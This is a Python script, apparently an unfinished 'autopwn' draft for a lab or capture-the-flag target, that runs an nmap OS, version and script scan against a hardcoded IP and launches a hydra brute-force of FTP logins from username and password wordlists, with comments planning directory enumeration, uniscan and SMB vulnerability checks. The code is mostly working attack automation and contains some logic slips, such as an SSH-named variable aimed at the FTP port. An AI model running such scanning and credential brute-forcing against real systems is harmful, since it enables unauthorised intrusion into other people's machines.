#!/usr/bin/env python3

# Flow:
# nmap port scanning >> append to result.txt
# thread: nmap scripts/vulns scanning >> append to result.txt
# curl headers for information
# if port 21/22/23 open:
#     check for vuln
#     thread hydra bruteforce >> if found, append to result.txt
# if port 80/443/8080 (or better: enumerated http service):
#     thread gobuster enum directory >> append to result.txt
#     thread uniscan >> result.txt
# if port 445 open:
#     check for smb vuln

import subprocess
import time
import os
import sys


# if 'SUDO_UID' not in os.environ.keys():
#     print("Run this script again with root permission")
#     exit()

filename = "output.txt"
output = open(filename, "w")

ip = "10.10.52.1"
nmap = ["sudo", "nmap", ip, "-O", "-sC", "-sV", "-T4", "-v", "-n"]

p = subprocess.Popen("sudo nmap 10.10.52.1 -O -sC -sV -T4 -v -n", stdout=subprocess.PIPE, shell=True)

sshport = 21
hydra = ["hydra", "-V", "-I", "-L", "500user.txt",
         "-P", "200pass.txt", f'{ip}', "ftp", "-s", f'{sshport}']


# command = 'hydra -V -I -L 500user.txt -P 200pass.txt 10.10.220.1 ssh'
h = subprocess.Popen(hydra, stdout=subprocess.PIPE)


out = h.communicate()[0]
# h.wait()

output.write(f"Autopwn scripts result on {ip}\n")
output.write("\n")
output.write("[x] Open Ports\n")


result = False
for line in iter(p.stdout.readline, b''):
    deline = line.rstrip().decode()

    if "Discovered" in deline:
        print(deline)
        output.write(f"{deline}\n")
        print(out)

    if "STATE" in deline:
        result = True
        output.write("\n")
        output.write("[x] Full Script Scan\n")

    if "Script Post-scanning" in deline:
        result = False

    if result:
        print(deline)
        output.write(f"{deline}\n")
        if ("open" in deline) and ("ssh" in deline):
            sshport = deline.split("/")[0]

# if sshport:
#     hydra = ["hydra", "-V", "-I", "-L", "500user.txt",
#              "-P", "200pass.txt", ip, "ssh", "-s", sshport]

#     h = subprocess.Popen(hydra, stdout=subprocess.PIPE)

#     for line in iter(h.stdout.readline, b''):
#         deline = line.rstrip().decode()
#         print(deline)
